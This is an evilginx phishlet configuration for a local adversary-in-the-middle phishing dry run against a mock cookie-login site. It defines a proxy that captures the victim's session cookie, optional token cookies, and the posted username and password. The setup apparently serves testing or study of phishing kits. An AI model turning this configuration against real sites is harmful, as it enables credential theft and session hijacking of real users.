# =============================================================================
# demo-cookie — cookie-session AiTM dry-run against demos/cookie
# =============================================================================
#
# Lure host (evilginx):     demo-cookie.local.phishkit  → 127.0.0.1
# Upstream origin (mock):   cookie-origin.local.phishkit → 127.0.0.2
#
# Start the HTTPS mock (needs cap_net_bind_service on node, or root):
#   make demo-cookie-https
#
# Auth shape: POST /login (form) → Set-Cookie: session=… → /dashboard
# Test creds: demo@phishkit.local / demo-password
#
# The upstream domain MUST differ from the lure hostname. Using the same host
# for both makes evilginx dial itself and never capture a session (C1).
# =============================================================================

min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'cookie-origin.local.phishkit', session: true, is_landing: true, auto_filter: true}

auth_tokens:
  - domain: '.cookie-origin.local.phishkit'
    keys:
      - 'session'
      - 'access_token,opt'
      - 'token,opt'
      - 'auth,opt'

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'cookie-origin.local.phishkit'
  path: '/login'
